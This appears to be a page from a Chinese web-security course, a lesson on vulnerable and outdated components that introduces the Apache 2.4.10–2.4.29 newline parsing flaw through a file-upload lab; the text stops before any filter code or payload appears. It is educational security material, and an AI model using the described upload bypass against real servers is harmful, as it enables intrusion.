<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">

<head>

    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
        <meta http-equiv='content-language' content='zh-cn'>
        <meta name='description' content=31&#32;易受攻击和过时的组件：DevSecOps与依赖项安全检查>
        <link rel="icon" href="/static/favicon.png">
        <title>31 易受攻击和过时的组件：DevSecOps与依赖项安全检查 </title>
        
        <link rel="stylesheet" href="/static/index.css">
        <link rel="stylesheet" href="/static/highlight.min.css">
        <script src="/static/highlight.min.js"></script>
        
        <meta name="generator" content="Hexo 4.2.0">
        <script defer src="https://umami.lianglianglee.com/script.js"
         data-website-id="83e5d5db-9d06-40e3-b780-cbae722fdf8c"></script>
    </head>

<body>
    <div class="book-container">
        <div class="book-sidebar">
            <div class="book-brand">
                <a href="/">
                    <img src="/static/favicon.png">
                    <span>技术文章摘抄</span>
                </a>
            </div>
            <div class="book-menu uncollapsible">
                <ul class="uncollapsible">
                    <li><a href="/" class="current-tab">首页</a></li>
                    <li><a href="../">上一级</a></li>
                </ul>
                <ul class="uncollapsible">
                    
                    <li>
                        <a class="menu-item" id="00 导读 解读OWASP Top10 2021.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/00%20%e5%af%bc%e8%af%bb%20%e8%a7%a3%e8%af%bbOWASP%20Top10%202021.md">00 导读 解读OWASP Top10 2021.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="00 开篇词 从黑客的视角找漏洞，从安全的角度优雅coding.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/00%20%e5%bc%80%e7%af%87%e8%af%8d%20%e4%bb%8e%e9%bb%91%e5%ae%a2%e7%9a%84%e8%a7%86%e8%a7%92%e6%89%be%e6%bc%8f%e6%b4%9e%ef%bc%8c%e4%bb%8e%e5%ae%89%e5%85%a8%e7%9a%84%e8%a7%92%e5%ba%a6%e4%bc%98%e9%9b%85coding.md">00 开篇词 从黑客的视角找漏洞，从安全的角度优雅coding.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="01 失效的访问控制：攻击者如何获取其他用户信息？.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/01%20%e5%a4%b1%e6%95%88%e7%9a%84%e8%ae%bf%e9%97%ae%e6%8e%a7%e5%88%b6%ef%bc%9a%e6%94%bb%e5%87%bb%e8%80%85%e5%a6%82%e4%bd%95%e8%8e%b7%e5%8f%96%e5%85%b6%e4%bb%96%e7%94%a8%e6%88%b7%e4%bf%a1%e6%81%af%ef%bc%9f.md">01 失效的访问控制：攻击者如何获取其他用户信息？.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="02 路径穿越：你的Web应用系统成了攻击者的资源管理器？.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/02%20%e8%b7%af%e5%be%84%e7%a9%bf%e8%b6%8a%ef%bc%9a%e4%bd%a0%e7%9a%84Web%e5%ba%94%e7%94%a8%e7%b3%bb%e7%bb%9f%e6%88%90%e4%ba%86%e6%94%bb%e5%87%bb%e8%80%85%e7%9a%84%e8%b5%84%e6%ba%90%e7%ae%a1%e7%90%86%e5%99%a8%ef%bc%9f.md">02 路径穿越：你的Web应用系统成了攻击者的资源管理器？.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="03 敏感数据泄露：攻击者如何获取用户账户？.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/03%20%e6%95%8f%e6%84%9f%e6%95%b0%e6%8d%ae%e6%b3%84%e9%9c%b2%ef%bc%9a%e6%94%bb%e5%87%bb%e8%80%85%e5%a6%82%e4%bd%95%e8%8e%b7%e5%8f%96%e7%94%a8%e6%88%b7%e8%b4%a6%e6%88%b7%ef%bc%9f.md">03 敏感数据泄露：攻击者如何获取用户账户？.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="04 权限不合理：攻击者进来就是root权限？.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/04%20%e6%9d%83%e9%99%90%e4%b8%8d%e5%90%88%e7%90%86%ef%bc%9a%e6%94%bb%e5%87%bb%e8%80%85%e8%bf%9b%e6%9d%a5%e5%b0%b1%e6%98%afroot%e6%9d%83%e9%99%90%ef%bc%9f.md">04 权限不合理：攻击者进来就是root权限？.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="05 CSRF：为什么用户的操作他自己不承认？.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/05%20CSRF%ef%bc%9a%e4%b8%ba%e4%bb%80%e4%b9%88%e7%94%a8%e6%88%b7%e7%9a%84%e6%93%8d%e4%bd%9c%e4%bb%96%e8%87%aa%e5%b7%b1%e4%b8%8d%e6%89%bf%e8%ae%a4%ef%bc%9f.md">05 CSRF：为什么用户的操作他自己不承认？.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="06 加密失败：使用了加密算法也会被破解吗？.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/06%20%e5%8a%a0%e5%af%86%e5%a4%b1%e8%b4%a5%ef%bc%9a%e4%bd%bf%e7%94%a8%e4%ba%86%e5%8a%a0%e5%af%86%e7%ae%97%e6%b3%95%e4%b9%9f%e4%bc%9a%e8%a2%ab%e7%a0%b4%e8%a7%a3%e5%90%97%ef%bc%9f.md">06 加密失败：使用了加密算法也会被破解吗？.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="07 弱编码：程序之间的沟通语言安全吗？.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/07%20%e5%bc%b1%e7%bc%96%e7%a0%81%ef%bc%9a%e7%a8%8b%e5%ba%8f%e4%b9%8b%e9%97%b4%e7%9a%84%e6%b2%9f%e9%80%9a%e8%af%ad%e8%a8%80%e5%ae%89%e5%85%a8%e5%90%97%ef%bc%9f.md">07 弱编码：程序之间的沟通语言安全吗？.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="08 数字证书：攻击者可以伪造证书吗？.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/08%20%e6%95%b0%e5%ad%97%e8%af%81%e4%b9%a6%ef%bc%9a%e6%94%bb%e5%87%bb%e8%80%85%e5%8f%af%e4%bb%a5%e4%bc%aa%e9%80%a0%e8%af%81%e4%b9%a6%e5%90%97%ef%bc%9f.md">08 数字证书：攻击者可以伪造证书吗？.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="09 密码算法问题：数学知识如何提高代码可靠性？.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/09%20%e5%af%86%e7%a0%81%e7%ae%97%e6%b3%95%e9%97%ae%e9%a2%98%ef%bc%9a%e6%95%b0%e5%ad%a6%e7%9f%a5%e8%af%86%e5%a6%82%e4%bd%95%e6%8f%90%e9%ab%98%e4%bb%a3%e7%a0%81%e5%8f%af%e9%9d%a0%e6%80%a7%ef%bc%9f.md">09 密码算法问题：数学知识如何提高代码可靠性？.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="10 弱随机数生成器：攻击者如何预测随机数？.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/10%20%e5%bc%b1%e9%9a%8f%e6%9c%ba%e6%95%b0%e7%94%9f%e6%88%90%e5%99%a8%ef%bc%9a%e6%94%bb%e5%87%bb%e8%80%85%e5%a6%82%e4%bd%95%e9%a2%84%e6%b5%8b%e9%9a%8f%e6%9c%ba%e6%95%b0%ef%bc%9f.md">10 弱随机数生成器：攻击者如何预测随机数？.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="11 忘记加“盐”：加密结果强度不够吗？.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/11%20%e5%bf%98%e8%ae%b0%e5%8a%a0%e2%80%9c%e7%9b%90%e2%80%9d%ef%bc%9a%e5%8a%a0%e5%af%86%e7%bb%93%e6%9e%9c%e5%bc%ba%e5%ba%a6%e4%b8%8d%e5%a4%9f%e5%90%97%ef%bc%9f.md">11 忘记加“盐”：加密结果强度不够吗？.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="12 注入（上）：SQL注入起手式.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/12%20%e6%b3%a8%e5%85%a5%ef%bc%88%e4%b8%8a%ef%bc%89%ef%bc%9aSQL%e6%b3%a8%e5%85%a5%e8%b5%b7%e6%89%8b%e5%bc%8f.md">12 注入（上）：SQL注入起手式.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="13 注入（下）：SQL注入技战法及相关安全实践.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/13%20%e6%b3%a8%e5%85%a5%ef%bc%88%e4%b8%8b%ef%bc%89%ef%bc%9aSQL%e6%b3%a8%e5%85%a5%e6%8a%80%e6%88%98%e6%b3%95%e5%8f%8a%e7%9b%b8%e5%85%b3%e5%ae%89%e5%85%a8%e5%ae%9e%e8%b7%b5.md">13 注入（下）：SQL注入技战法及相关安全实践.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="14 自动化注入神器（一）：sqlmap的设计思路解析.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/14%20%e8%87%aa%e5%8a%a8%e5%8c%96%e6%b3%a8%e5%85%a5%e7%a5%9e%e5%99%a8%ef%bc%88%e4%b8%80%ef%bc%89%ef%bc%9asqlmap%e7%9a%84%e8%ae%be%e8%ae%a1%e6%80%9d%e8%b7%af%e8%a7%a3%e6%9e%90.md">14 自动化注入神器（一）：sqlmap的设计思路解析.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="15 自动化注入神器（二）：sqlmap的设计架构解析.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/15%20%e8%87%aa%e5%8a%a8%e5%8c%96%e6%b3%a8%e5%85%a5%e7%a5%9e%e5%99%a8%ef%bc%88%e4%ba%8c%ef%bc%89%ef%bc%9asqlmap%e7%9a%84%e8%ae%be%e8%ae%a1%e6%9e%b6%e6%9e%84%e8%a7%a3%e6%9e%90.md">15 自动化注入神器（二）：sqlmap的设计架构解析.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="16 自动化注入神器（三）：sqlmap的核心实现拆解.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/16%20%e8%87%aa%e5%8a%a8%e5%8c%96%e6%b3%a8%e5%85%a5%e7%a5%9e%e5%99%a8%ef%bc%88%e4%b8%89%ef%bc%89%ef%bc%9asqlmap%e7%9a%84%e6%a0%b8%e5%bf%83%e5%ae%9e%e7%8e%b0%e6%8b%86%e8%a7%a3.md">16 自动化注入神器（三）：sqlmap的核心实现拆解.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="17 自动化注入神器（四）：sqlmap的核心功能解析.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/17%20%e8%87%aa%e5%8a%a8%e5%8c%96%e6%b3%a8%e5%85%a5%e7%a5%9e%e5%99%a8%ef%bc%88%e5%9b%9b%ef%bc%89%ef%bc%9asqlmap%e7%9a%84%e6%a0%b8%e5%bf%83%e5%8a%9f%e8%83%bd%e8%a7%a3%e6%9e%90.md">17 自动化注入神器（四）：sqlmap的核心功能解析.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="19 失效的输入检测（上）：攻击者有哪些绕过方案？.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/19%20%e5%a4%b1%e6%95%88%e7%9a%84%e8%be%93%e5%85%a5%e6%a3%80%e6%b5%8b%ef%bc%88%e4%b8%8a%ef%bc%89%ef%bc%9a%e6%94%bb%e5%87%bb%e8%80%85%e6%9c%89%e5%93%aa%e4%ba%9b%e7%bb%95%e8%bf%87%e6%96%b9%e6%a1%88%ef%bc%9f.md">19 失效的输入检测（上）：攻击者有哪些绕过方案？.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="20 失效的输入检测（下）：攻击者有哪些绕过方案？.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/20%20%e5%a4%b1%e6%95%88%e7%9a%84%e8%be%93%e5%85%a5%e6%a3%80%e6%b5%8b%ef%bc%88%e4%b8%8b%ef%bc%89%ef%bc%9a%e6%94%bb%e5%87%bb%e8%80%85%e6%9c%89%e5%93%aa%e4%ba%9b%e7%bb%95%e8%bf%87%e6%96%b9%e6%a1%88%ef%bc%9f.md">20 失效的输入检测（下）：攻击者有哪些绕过方案？.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="21 XSS（上）：前端攻防的主战场.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/21%20XSS%ef%bc%88%e4%b8%8a%ef%bc%89%ef%bc%9a%e5%89%8d%e7%ab%af%e6%94%bb%e9%98%b2%e7%9a%84%e4%b8%bb%e6%88%98%e5%9c%ba.md">21 XSS（上）：前端攻防的主战场.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="22 XSS（中）：跨站脚本攻击的危害性.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/22%20XSS%ef%bc%88%e4%b8%ad%ef%bc%89%ef%bc%9a%e8%b7%a8%e7%ab%99%e8%84%9a%e6%9c%ac%e6%94%bb%e5%87%bb%e7%9a%84%e5%8d%b1%e5%ae%b3%e6%80%a7.md">22 XSS（中）：跨站脚本攻击的危害性.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="23 XSS（下）：检测与防御方案解析.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/23%20XSS%ef%bc%88%e4%b8%8b%ef%bc%89%ef%bc%9a%e6%a3%80%e6%b5%8b%e4%b8%8e%e9%98%b2%e5%be%a1%e6%96%b9%e6%a1%88%e8%a7%a3%e6%9e%90.md">23 XSS（下）：检测与防御方案解析.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="24 资源注入：攻击方式为什么会升级？.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/24%20%e8%b5%84%e6%ba%90%e6%b3%a8%e5%85%a5%ef%bc%9a%e6%94%bb%e5%87%bb%e6%96%b9%e5%bc%8f%e4%b8%ba%e4%bb%80%e4%b9%88%e4%bc%9a%e5%8d%87%e7%ba%a7%ef%bc%9f.md">24 资源注入：攻击方式为什么会升级？.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="25 业务逻辑漏洞：好的开始是成功的一半.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/25%20%e4%b8%9a%e5%8a%a1%e9%80%bb%e8%be%91%e6%bc%8f%e6%b4%9e%ef%bc%9a%e5%a5%bd%e7%9a%84%e5%bc%80%e5%a7%8b%e6%98%af%e6%88%90%e5%8a%9f%e7%9a%84%e4%b8%80%e5%8d%8a.md">25 业务逻辑漏洞：好的开始是成功的一半.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="26 包含敏感信息的报错：将安全开发标准应用到项目中.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/26%20%e5%8c%85%e5%90%ab%e6%95%8f%e6%84%9f%e4%bf%a1%e6%81%af%e7%9a%84%e6%8a%a5%e9%94%99%ef%bc%9a%e5%b0%86%e5%ae%89%e5%85%a8%e5%bc%80%e5%8f%91%e6%a0%87%e5%87%86%e5%ba%94%e7%94%a8%e5%88%b0%e9%a1%b9%e7%9b%ae%e4%b8%ad.md">26 包含敏感信息的报错：将安全开发标准应用到项目中.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="27 用户账户安全：账户安全体系设计方案与实践.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/27%20%e7%94%a8%e6%88%b7%e8%b4%a6%e6%88%b7%e5%ae%89%e5%85%a8%ef%bc%9a%e8%b4%a6%e6%88%b7%e5%ae%89%e5%85%a8%e4%bd%93%e7%b3%bb%e8%ae%be%e8%ae%a1%e6%96%b9%e6%a1%88%e4%b8%8e%e5%ae%9e%e8%b7%b5.md">27 用户账户安全：账户安全体系设计方案与实践.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="28 安全配置错误：安全问题不只是代码安全.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/28%20%e5%ae%89%e5%85%a8%e9%85%8d%e7%bd%ae%e9%94%99%e8%af%af%ef%bc%9a%e5%ae%89%e5%85%a8%e9%97%ae%e9%a2%98%e4%b8%8d%e5%8f%aa%e6%98%af%e4%bb%a3%e7%a0%81%e5%ae%89%e5%85%a8.md">28 安全配置错误：安全问题不只是代码安全.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="29 Session与Cookie：账户体系的安全设计原理.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/29%20Session%e4%b8%8eCookie%ef%bc%9a%e8%b4%a6%e6%88%b7%e4%bd%93%e7%b3%bb%e7%9a%84%e5%ae%89%e5%85%a8%e8%ae%be%e8%ae%a1%e5%8e%9f%e7%90%86.md">29 Session与Cookie：账户体系的安全设计原理.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="30 HTTP Header安全标志：协议级别的安全支持.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/30%20HTTP%20Header%e5%ae%89%e5%85%a8%e6%a0%87%e5%bf%97%ef%bc%9a%e5%8d%8f%e8%ae%ae%e7%ba%a7%e5%88%ab%e7%9a%84%e5%ae%89%e5%85%a8%e6%94%af%e6%8c%81.md">30 HTTP Header安全标志：协议级别的安全支持.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="31 易受攻击和过时的组件：DevSecOps与依赖项安全检查.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/31%20%e6%98%93%e5%8f%97%e6%94%bb%e5%87%bb%e5%92%8c%e8%bf%87%e6%97%b6%e7%9a%84%e7%bb%84%e4%bb%b6%ef%bc%9aDevSecOps%e4%b8%8e%e4%be%9d%e8%b5%96%e9%a1%b9%e5%ae%89%e5%85%a8%e6%a3%80%e6%9f%a5.md">31 易受攻击和过时的组件：DevSecOps与依赖项安全检查.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="32 软件和数据完整性故障：SolarWinds事件的幕后⿊⼿.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/32%20%e8%bd%af%e4%bb%b6%e5%92%8c%e6%95%b0%e6%8d%ae%e5%ae%8c%e6%95%b4%e6%80%a7%e6%95%85%e9%9a%9c%ef%bc%9aSolarWinds%e4%ba%8b%e4%bb%b6%e7%9a%84%e5%b9%95%e5%90%8e%e2%bf%8a%e2%bc%bf.md">32 软件和数据完整性故障：SolarWinds事件的幕后⿊⼿.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="33 SSRF：穿越边界防护的利刃.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/33%20SSRF%ef%bc%9a%e7%a9%bf%e8%b6%8a%e8%be%b9%e7%95%8c%e9%98%b2%e6%8a%a4%e7%9a%84%e5%88%a9%e5%88%83.md">33 SSRF：穿越边界防护的利刃.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="34 Crawler VS Fuzzing：DAST与机器学习.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/34%20Crawler%20VS%20Fuzzing%ef%bc%9aDAST%e4%b8%8e%e6%9c%ba%e5%99%a8%e5%ad%a6%e4%b9%a0.md">34 Crawler VS Fuzzing：DAST与机器学习.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="35 自动化攻防：低代码驱动的渗透工具积累.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/35%20%e8%87%aa%e5%8a%a8%e5%8c%96%e6%94%bb%e9%98%b2%ef%bc%9a%e4%bd%8e%e4%bb%a3%e7%a0%81%e9%a9%b1%e5%8a%a8%e7%9a%84%e6%b8%97%e9%80%8f%e5%b7%a5%e5%85%b7%e7%a7%af%e7%b4%af.md">35 自动化攻防：低代码驱动的渗透工具积累.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="36 智能攻防：构建个性化攻防平台.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/36%20%e6%99%ba%e8%83%bd%e6%94%bb%e9%98%b2%ef%bc%9a%e6%9e%84%e5%bb%ba%e4%b8%aa%e6%80%a7%e5%8c%96%e6%94%bb%e9%98%b2%e5%b9%b3%e5%8f%b0.md">36 智能攻防：构建个性化攻防平台.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="大咖助场 数字证书，困境与未来.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/%e5%a4%a7%e5%92%96%e5%8a%a9%e5%9c%ba%20%e6%95%b0%e5%ad%97%e8%af%81%e4%b9%a6%ef%bc%8c%e5%9b%b0%e5%a2%83%e4%b8%8e%e6%9c%aa%e6%9d%a5.md">大咖助场 数字证书，困境与未来.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="春节策划（一）  视频课内容精选：Web渗透测试工具教学.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/%e6%98%a5%e8%8a%82%e7%ad%96%e5%88%92%ef%bc%88%e4%b8%80%ef%bc%89%20%20%e8%a7%86%e9%a2%91%e8%af%be%e5%86%85%e5%ae%b9%e7%b2%be%e9%80%89%ef%bc%9aWeb%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95%e5%b7%a5%e5%85%b7%e6%95%99%e5%ad%a6.md">春节策划（一）  视频课内容精选：Web渗透测试工具教学.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="春节策划（三） 一套测试题，看看对课程内容的掌握情况.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/%e6%98%a5%e8%8a%82%e7%ad%96%e5%88%92%ef%bc%88%e4%b8%89%ef%bc%89%20%e4%b8%80%e5%a5%97%e6%b5%8b%e8%af%95%e9%a2%98%ef%bc%8c%e7%9c%8b%e7%9c%8b%e5%af%b9%e8%af%be%e7%a8%8b%e5%86%85%e5%ae%b9%e7%9a%84%e6%8e%8c%e6%8f%a1%e6%83%85%e5%86%b5.md">春节策划（三） 一套测试题，看看对课程内容的掌握情况.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="春节策划（二）   给你推荐4本Web安全图书.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/%e6%98%a5%e8%8a%82%e7%ad%96%e5%88%92%ef%bc%88%e4%ba%8c%ef%bc%89%20%20%20%e7%bb%99%e4%bd%a0%e6%8e%a8%e8%8d%904%e6%9c%acWeb%e5%ae%89%e5%85%a8%e5%9b%be%e4%b9%a6.md">春节策划（二）   给你推荐4本Web安全图书.md</a>
                    </li>
                    
                    <li>
                        <a class="menu-item" id="结束语 无畏前行.md" href="/%e4%b8%93%e6%a0%8f/Web%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e5%ae%9e%e6%88%98/%e7%bb%93%e6%9d%9f%e8%af%ad%20%e6%97%a0%e7%95%8f%e5%89%8d%e8%a1%8c.md">结束语 无畏前行.md</a>
                    </li>
                    
                    <li><a href="https://lianglianglee.com/assets/%E6%8D%90%E8%B5%A0.md">捐赠</a></li>
                </ul>

            </div>
        </div>

        <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
            <div class="sidebar-toggle-inner"></div>
        </div>
        <div class="off-canvas-content">
            <div class="columns">
                <div class="column col-12 col-lg-12">
                    <div class="book-navbar">
                        
                        <header class="navbar">
                            <section class="navbar-section">
                                <a onclick="open_sidebar()">
                                    <i class="icon icon-menu"></i>
                                </a>
                            </section>
                        </header>
                    </div>
                    <div class="book-content" style="max-width: 960px; margin: 0 auto;
    overflow-x: auto;
    overflow-y: hidden;">
                        <div class="book-post">
                            
                            
                            
                            <p id="tip" align="center"></p>
                            <h1 id="title" data-id="31 易受攻击和过时的组件：DevSecOps与依赖项安全检查" class="title">31 易受攻击和过时的组件：DevSecOps与依赖项安全检查</h1>
                            <div><p>你好，我是王昊天。</p>

<p>不知道你是否听说过木桶效应？我们可以看下图这个木桶，假设它的底面为一整块木板，桶身由15块木板组成。现在，我们需要用这个木桶装尽可能多的水，显而易见，它能装水的数量仅与木板中高度最低的相关。</p>

<p><img src="assets/9f08fdb5bc9041a6ace6a69b8bf434d2.jpg" alt="图片" /></p>

<p>其实对于Web应用的安全性来说，木桶效应同样有效。假设我们的Web应用运用了多个组件，例如Struts、Apache，那么<strong>它的安全强度也是由这些组件中最脆弱的一个所决定</strong>。所以在我们开发一个Web应用时，需要确保每一个组件都不存在已知的安全问题。</p>

<p>那么这节课，就让我们一起学习下Web应用中组件的安全问题吧。</p>

<h2 id="易受攻击和过时的组件">易受攻击和过时的组件</h2>

<p>首先，我们需要了解Web应用中具有哪些组件。</p>

<p>通常来讲，Web应用一般都包含三个基础组件，<strong>Web应用服务组件、Web数据库组件以及Web客户端浏览器组件</strong>。其中，我们很容易知道Web应用服务器是用于运行Web应用的，Web数据库服务器是用于给Web应用提供需要的数据，而Web客户端浏览器则可以用来展示Web应用返回的内容，同时决定用户与Web应用的交互方式。</p>

<p>其实上述三个基础组件本身，也是由多个组件所构成的，例如Web应用服务器可能会包含Struts、Apache应用等多个组件，而Struts、Apache内部也会包含很多组件。所以组件是一个很灵活的说法，<strong>你可以将它简单地理解为是一个独立功能单元</strong>。</p>

<p>随着Web应用的功能越来越复杂，应用中组件的个数也在不断提升，这会对Web应用的安全造成一定的威胁，因为我们难以确保每个组件都是安全的。这是一个棘手的问题，它在OWASP 2021中荣获第六位，下面让我们具体地学习一些典型的易受攻击和过时的组件吧。</p>

<h3 id="apache换行解析漏洞">Apache换行解析漏洞</h3>

<p>在之前的学习中，我们知道了Apache是一款使用很广泛的Web应用组件，尽管它的功能非常强大，但是在过去的版本中，它也存在换行解析漏洞，所以我们如果用这款工具时，要注意它的版本信息。</p>

<p>这个换行解析漏洞影响的版本为Apache 2.4.10 - 2.4.29，接下来让我们通过示例来具体的学习Apache换行解析漏洞。</p>

<p><img src="assets/d2c0f4fffa2f42219af717151ca86821.jpg" alt="图片" /></p>

<p>这是一个文件上传靶场，我们需要上传一个test.php文件，点击提交后，我们可以看到页面返回了bad file。发现被拦截之后，我查看靶场源码，看到了下面的过滤代码：</p>

